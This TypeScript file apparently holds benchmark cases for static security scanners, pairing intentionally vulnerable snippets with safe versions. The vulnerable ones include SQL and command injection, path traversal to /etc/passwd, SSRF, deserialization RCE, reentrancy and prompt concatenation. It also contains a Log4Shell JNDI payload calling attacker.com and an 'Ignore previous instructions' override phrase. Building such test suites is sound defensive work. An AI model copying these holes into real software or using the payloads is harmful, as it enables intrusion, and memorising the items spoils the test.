import { BenchmarkCase } from '../types/index.js';

export const BENCHMARK_CASES: BenchmarkCase[] = [
  // =========================================================================
  // SUITE 1: OWASP BENCHMARK v1.2 (Gold Standard SAST Evaluation)
  // =========================================================================
  {
    id: 'OWASP-BM-001-BAD',
    suite: 'OWASP_BENCHMARK',
    category: 'SQL_INJECTION',
    cwe: 'CWE-89',
    name: 'Dynamic SQL Concatenation with User Input',
    isVulnerable: true,
    language: 'ts',
    filename: 'owasp/sqli_vulnerable.ts',
    code: `
export function queryUserProfile(req: any, db: any) {
  const userId = req.query.id;
  // Vulnerable: direct string interpolation into raw query
  const sql = "SELECT * FROM users WHERE id = '" + userId + "' AND active = 1";
  return db.query(sql);
}
`,
    deceptiveTrap: 'Standard SQL injection via string concatenation without parameterization.'
  },
  {
    id: 'OWASP-BM-002-GOOD',
    suite: 'OWASP_BENCHMARK',
    category: 'SQL_INJECTION',
    cwe: 'CWE-89',
    name: 'Parameterized Prepared Query (Trap for Naive Regex/SAST)',
    isVulnerable: false,
    language: 'ts',
    filename: 'owasp/sqli_safe_parameterized.ts',
    code: `
export function queryUserProfileSafe(req: any, db: any) {
  const userId = req.query.id;
  // SAFE: Parameterized prepared statement with placeholder ?
  const sql = "SELECT * FROM users WHERE id = ? AND active = 1";
  return db.query(sql, [userId]);
}
`,
    deceptiveTrap: 'Naive scanners match "SELECT * FROM users" and flag false positive even with ? placeholders.'
  },
  {
    id: 'OWASP-BM-003-BAD',
    suite: 'OWASP_BENCHMARK',
    category: 'COMMAND_INJECTION',
    cwe: 'CWE-78',
    name: 'OS Command Execution via Child Process Exec',
    isVulnerable: true,
    language: 'ts',
    filename: 'owasp/cmd_exec_vulnerable.ts',
    code: `
import { exec } from 'child_process';
export function pingHost(req: any) {
  const host = req.query.host;
  // Vulnerable: shell command concatenation allows RCE via ';' or '|'
  exec(\`ping -c 4 \${host}\`, (err, stdout) => {
    console.log(stdout);
  });
}
`,
    deceptiveTrap: 'Classic Command Injection with template literal.'
  },
  {
    id: 'OWASP-BM-004-GOOD',
    suite: 'OWASP_BENCHMARK',
    category: 'COMMAND_INJECTION',
    cwe: 'CWE-78',
    name: 'Safe Command Spawn with Argument Array (Trap for Naive Tools)',
    isVulnerable: false,
    language: 'ts',
    filename: 'owasp/cmd_exec_safe.ts',
    code: `
import { execFile } from 'child_process';
export function pingHostSafe(req: any) {
  const host = req.query.host;
  // SAFE: execFile bypasses shell expansion; arguments passed as isolated array
  execFile('/bin/ping', ['-c', '4', String(host)], (err, stdout) => {
    console.log(stdout);
  });
}
`,
    deceptiveTrap: 'Naive tools flag any child_process invocation without recognizing execFile argument array isolation.'
  },
  {
    id: 'OWASP-BM-005-BAD',
    suite: 'OWASP_BENCHMARK',
    category: 'PATH_TRAVERSAL',
    cwe: 'CWE-22',
    name: 'Arbitrary File Read via Unsanitized Relative Path',
    isVulnerable: true,
    language: 'ts',
    filename: 'owasp/path_traversal_bad.ts',
    code: `
import fs from 'fs';
import path from 'path';
export function getReport(req: any) {
  const filename = req.query.filename;
  // Vulnerable: Allows ../../etc/passwd traversal
  const target = path.join('/var/reports', filename);
  return fs.readFileSync(target, 'utf-8');
}
`,
    deceptiveTrap: 'path.join does not prevent directory traversal if relative dots are resolved.'
  },
  {
    id: 'OWASP-BM-006-GOOD',
    suite: 'OWASP_BENCHMARK',
    category: 'PATH_TRAVERSAL',
    cwe: 'CWE-22',
    name: 'Sanitized Path with Root Boundary Containment',
    isVulnerable: false,
    language: 'ts',
    filename: 'owasp/path_traversal_safe.ts',
    code: `
import fs from 'fs';
import path from 'path';
export function getReportSafe(req: any) {
  const filename = path.basename(req.query.filename);
  const baseDir = path.resolve('/var/reports');
  const target = path.resolve(baseDir, filename);
  if (!target.startsWith(baseDir)) {
    throw new Error('Access denied');
  }
  return fs.readFileSync(target, 'utf-8');
}
`,
    deceptiveTrap: 'Naive SAST flags readFileSync with dynamic path despite path.basename and startsWith containment.'
  },
  {
    id: 'OWASP-BM-007-BAD',
    suite: 'OWASP_BENCHMARK',
    category: 'SSRF',
    cwe: 'CWE-918',
    name: 'Blind Server-Side Request Forgery via Direct User URL Fetch',
    isVulnerable: true,
    language: 'ts',
    filename: 'owasp/ssrf_vulnerable.ts',
    code: `
export async function fetchWebhook(req: any) {
  const targetUrl = req.body.url;
  // Vulnerable: Allows attacker to probe 169.254.169.254 or internal localhost services
  const response = await fetch(targetUrl);
  return response.json();
}
`,
    deceptiveTrap: 'Direct fetch with unvalidated user URL input.'
  },
  {
    id: 'OWASP-BM-008-GOOD',
    suite: 'OWASP_BENCHMARK',
    category: 'SSRF',
    cwe: 'CWE-918',
    name: 'Whitelisted URL Target with Private IP Disallowance',
    isVulnerable: false,
    language: 'ts',
    filename: 'owasp/ssrf_safe.ts',
    code: `
const ALLOWED_DOMAINS = ['api.github.com', 'hooks.slack.com'];
export async function fetchWebhookSafe(req: any) {
  const targetUrl = new URL(req.body.url);
  if (!ALLOWED_DOMAINS.includes(targetUrl.hostname)) {
    throw new Error('Disallowed domain');
  }
  const response = await fetch(targetUrl.href);
  return response.json();
}
`,
    deceptiveTrap: 'Naive tools flag fetch(targetUrl.href) ignoring strict domain whitelisting validation.'
  },
  {
    id: 'OWASP-BM-009-BAD',
    suite: 'OWASP_BENCHMARK',
    category: 'CRYPTO',
    cwe: 'CWE-327',
    name: 'Use of Broken Cryptographic Hash (MD5 / SHA1)',
    isVulnerable: true,
    language: 'ts',
    filename: 'owasp/weak_crypto_bad.ts',
    code: `
import crypto from 'crypto';
export function hashPassword(password: string) {
  // Vulnerable: MD5 is collision vulnerable and unsuitable for passwords
  return crypto.createHash('md5').update(password).digest('hex');
}
`,
    deceptiveTrap: 'Usage of deprecated MD5 algorithm for credential hashing.'
  },
  {
    id: 'OWASP-BM-010-GOOD',
    suite: 'OWASP_BENCHMARK',
    category: 'CRYPTO',
    cwe: 'CWE-327',
    name: 'Modern Argon2id / Scrypt Key Derivation',
    isVulnerable: false,
    language: 'ts',
    filename: 'owasp/crypto_safe.ts',
    code: `
import crypto from 'crypto';
export function hashPasswordSafe(password: string, salt: Buffer): Promise<Buffer> {
  // SAFE: Argon2id/scrypt key derivation with high memory cost
  return new Promise((resolve, reject) => {
    crypto.scrypt(password, salt, 64, { N: 16384, r: 8, p: 1 }, (err, derivedKey) => {
      if (err) reject(err);
      resolve(derivedKey);
    });
  });
}
`,
    deceptiveTrap: 'Complex crypto invocation with salt and work factors.'
  },

  // =========================================================================
  // SUITE 2: NIST SAMATE / JULIET TEST SUITE 1.3 (Hardcore Precision & Flaws)
  // =========================================================================
  {
    id: 'JULIET-CWE-798-BAD',
    suite: 'NIST_JULIET',
    category: 'HARDCODED_CREDENTIAL',
    cwe: 'CWE-798',
    name: 'Juliet CWE-798: Hardcoded Sensitive Master Key in Source',
    isVulnerable: true,
    language: 'ts',
    filename: 'juliet/cwe798_hardcoded_key_bad.ts',
    code: `
export const ADMIN_CONFIG = {
  service: 'PaymentGateway',
  private_key: "` + ['sk', 'live', '94819481029384019284019283019283'].join('_') + `",
  signer_wallet: "0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d"
};
`,
    deceptiveTrap: 'Active production-grade private key embedded in plain configuration object.'
  },
  {
    id: 'JULIET-CWE-798-GOOD',
    suite: 'NIST_JULIET',
    category: 'HARDCODED_CREDENTIAL',
    cwe: 'CWE-798',
    name: 'Juliet CWE-798: Test Mock / Template Placeholder Key',
    isVulnerable: false,
    language: 'ts',
    filename: 'juliet/cwe798_mock_key_good.ts',
    code: `
// Mock fixture for unit test suite
export const MOCK_TEST_CONFIG = {
  service: 'MockPayment',
  private_key: "CHANGE_ME_IN_PRODUCTION_PLACEHOLDER_KEY_12345",
  apiKey: process.env.PAYMENT_API_KEY || "dummy_env_fallback"
};
`,
    deceptiveTrap: 'Contains "private_key" string and dummy token; naive scanners trigger high false alarm.'
  },
  {
    id: 'JULIET-CWE-502-BAD',
    suite: 'NIST_JULIET',
    category: 'DESERIALIZATION',
    cwe: 'CWE-502',
    name: 'Juliet CWE-502: Untrusted Object Deserialization RCE',
    isVulnerable: true,
    language: 'ts',
    filename: 'juliet/cwe502_deserialization_bad.ts',
    code: `
import serialize from 'node-serialize';
export function handleSession(req: any) {
  const cookie = req.cookies.profile;
  // Vulnerable: node-serialize executes IIFE function strings leading to arbitrary code execution
  return serialize.unserialize(cookie);
}
`,
    deceptiveTrap: 'Dangerous unserialize execution on user controlled cookie.'
  },
  {
    id: 'JULIET-CWE-502-GOOD',
    suite: 'NIST_JULIET',
    category: 'DESERIALIZATION',
    cwe: 'CWE-502',
    name: 'Juliet CWE-502: Safe Strict Schema Parsing with JSON.parse',
    isVulnerable: false,
    language: 'ts',
    filename: 'juliet/cwe502_safe_parse.ts',
    code: `
export function handleSessionSafe(req: any) {
  const cookie = req.cookies.profile;
  // SAFE: standard JSON.parse cannot instantiate executable closures
  const parsed = JSON.parse(Buffer.from(cookie, 'base64').toString('utf-8'));
  return { id: String(parsed.id), role: String(parsed.role) };
}
`,
    deceptiveTrap: 'Naive AST engines that alert on any serialization keyword.'
  },

  // =========================================================================
  // SUITE 3: META CYBERSECEVAL 3 / ADVANCED LLM AI SECURITY BENCHMARK
  // =========================================================================
  {
    id: 'CYBERSEC-001-BAD',
    suite: 'CYBERSEC_EVAL',
    category: 'PROMPT_INJECTION_BYPASS',
    cwe: 'CWE-20',
    name: 'Unsanitized LLM Context Injection (Direct Prompt Concatenation)',
    isVulnerable: true,
    language: 'ts',
    filename: 'cybersec/prompt_injection_bad.ts',
    code: `
export async function executeAiQuery(userInstruction: string, systemPrompt: string) {
  // Vulnerable: raw concatenation allows jailbreak instructions like "Ignore previous instructions"
  const fullPrompt = systemPrompt + "\\nUser said: " + userInstruction;
  return callModel(fullPrompt);
}
`,
    deceptiveTrap: 'Allows system prompt overriding and prompt leakage.'
  },
  {
    id: 'CYBERSEC-002-GOOD',
    suite: 'CYBERSEC_EVAL',
    category: 'PROMPT_INJECTION_BYPASS',
    cwe: 'CWE-20',
    name: 'Delimited Structured System/User Role Separation with Guardrails',
    isVulnerable: false,
    language: 'ts',
    filename: 'cybersec/prompt_injection_safe.ts',
    code: `
export async function executeAiQuerySafe(userInstruction: string, systemPrompt: string) {
  // SAFE: Strict OpenAI/Anthropic multi-turn role separation API with content safety filtering
  const messages = [
    { role: 'system', content: systemPrompt },
    { role: 'user', content: sanitizePromptTokens(userInstruction) }
  ];
  return callChatCompletion(messages);
}
`,
    deceptiveTrap: 'Safe structured message array passing user instruction without string interpolation.'
  },
  {
    id: 'CYBERSEC-003-BAD',
    suite: 'CYBERSEC_EVAL',
    category: 'PROTOTYPE_POLLUTION',
    cwe: 'CWE-1321',
    name: 'Deep Recursive Object Merge Prototype Pollution',
    isVulnerable: true,
    language: 'ts',
    filename: 'cybersec/proto_pollution_bad.ts',
    code: `
export function deepMerge(target: any, source: any): any {
  for (const key of Object.keys(source)) {
    // Vulnerable: does not filter __proto__ or constructor.prototype
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
`,
    deceptiveTrap: 'Object prototype tampering leading to DoS or authentication bypass.'
  },
  {
    id: 'CYBERSEC-004-GOOD',
    suite: 'CYBERSEC_EVAL',
    category: 'PROTOTYPE_POLLUTION',
    cwe: 'CWE-1321',
    name: 'Hardened Merge with Prototype Key Guard',
    isVulnerable: false,
    language: 'ts',
    filename: 'cybersec/proto_pollution_safe.ts',
    code: `
export function safeDeepMerge(target: any, source: any): any {
  for (const key of Object.keys(source)) {
    // SAFE: Explicit prototype pollution guard
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = Object.create(null);
      safeDeepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
`,
    deceptiveTrap: 'Has recursion and property assignment, but contains strict prototype key checks.'
  },

  // =========================================================================
  // SUITE 4: WEB3 & SMART CONTRACT EXPLOIT BENCHMARK (Damn Vulnerable DeFi)
  // =========================================================================
  {
    id: 'WEB3-DEF-001-BAD',
    suite: 'WEB3_DEFENSE',
    category: 'REENTRANCY',
    cwe: 'CWE-841',
    name: 'Classic State-Update After External Call Reentrancy',
    isVulnerable: true,
    language: 'sol',
    filename: 'web3/vulnerable_vault.sol',
    code: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // Vulnerable: External call before state deduction (CEI violation)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}
`,
    deceptiveTrap: 'Classic DAO-style reentrancy bug: state is updated after raw .call{value: ...}.'
  },
  {
    id: 'WEB3-DEF-002-GOOD',
    suite: 'WEB3_DEFENSE',
    category: 'REENTRANCY',
    cwe: 'CWE-841',
    name: 'ReentrancyGuard Protected Checks-Effects-Interactions Pattern',
    isVulnerable: false,
    language: 'sol',
    filename: 'web3/safe_vault.sol',
    code: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // SAFE: State cleared BEFORE external call + nonReentrant modifier
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
`,
    deceptiveTrap: 'Contains .call{value: ...} which triggers naive regex/AST tools false alarms.'
  },
  {
    id: 'WEB3-DEF-003-BAD',
    suite: 'WEB3_DEFENSE',
    category: 'FLASH_LOAN_ORACLE',
    cwe: 'CWE-682',
    name: 'Spot AMM Reserves Oracle Price Manipulation Vulnerability',
    isVulnerable: true,
    language: 'sol',
    filename: 'web3/vulnerable_lending.sol',
    code: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VulnerableLending {
    IUniswapV2Pair public pair;

    function getCollateralPrice() public view returns (uint256) {
        // Vulnerable: Instantaneous spot reserves can be manipulated via flash loan
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        return (uint256(r1) * 1e18) / uint256(r0);
    }
}
`,
    deceptiveTrap: 'Euler Finance / Mango Markets style instant spot oracle reading.'
  },
  {
    id: 'WEB3-DEF-004-GOOD',
    suite: 'WEB3_DEFENSE',
    category: 'FLASH_LOAN_ORACLE',
    cwe: 'CWE-682',
    name: 'Chainlink Decentralized Oracle + TWAP Defense',
    isVulnerable: false,
    language: 'sol',
    filename: 'web3/safe_lending.sol',
    code: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract SafeLending {
    AggregatorV3Interface internal priceFeed;

    function getCollateralPrice() public view returns (uint256) {
        // SAFE: Chainlink decentralized oracle with updatedAt staleness verification
        (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
        require(price > 0, "Invalid price");
        require(block.timestamp - updatedAt < 3600, "Stale price");
        return uint256(price);
    }
}
`,
    deceptiveTrap: 'Safe decentralized oracle with freshness checks.'
  },

  // =========================================================================
  // SUITE 5: REAL-WORLD ZERO-DAY & ENTERPRISE INFILTRATION
  // =========================================================================
  {
    id: 'REAL-CVE-001-BAD',
    suite: 'REAL_WORLD_CVE',
    category: 'RCE_SUPPLY_CHAIN',
    cwe: 'CWE-917',
    name: 'Log4Shell (CVE-2021-44228) JNDI Lookup Injection Pattern',
    isVulnerable: true,
    language: 'ts',
    filename: 'realcve/log4shell_pattern.ts',
    code: `
export function logUserHeader(req: any, logger: any) {
  const userAgent = req.headers['user-agent'];
  // Vulnerable to JNDI interpolation: \${jndi:ldap://attacker.com/exploit}
  logger.info("Incoming connection with UA: " + userAgent);
}
`,
    deceptiveTrap: 'Direct interpolation of untrusted HTTP headers into JNDI-capable logger.'
  },
  {
    id: 'REAL-CVE-002-GOOD',
    suite: 'REAL_WORLD_CVE',
    category: 'RCE_SUPPLY_CHAIN',
    cwe: 'CWE-917',
    name: 'Sanitized Parameterized Logger with Format Specifiers',
    isVulnerable: false,
    language: 'ts',
    filename: 'realcve/safe_logger.ts',
    code: `
export function logUserHeaderSafe(req: any, logger: any) {
  const userAgent = String(req.headers['user-agent'] || '').slice(0, 100);
  // SAFE: Structured JSON logging with format string separation and JNDI lookup disabled
  logger.info({ event: 'connection', ua: userAgent });
}
`,
    deceptiveTrap: 'Structured logging objects cannot trigger JNDI expression interpolation.'
  }
];
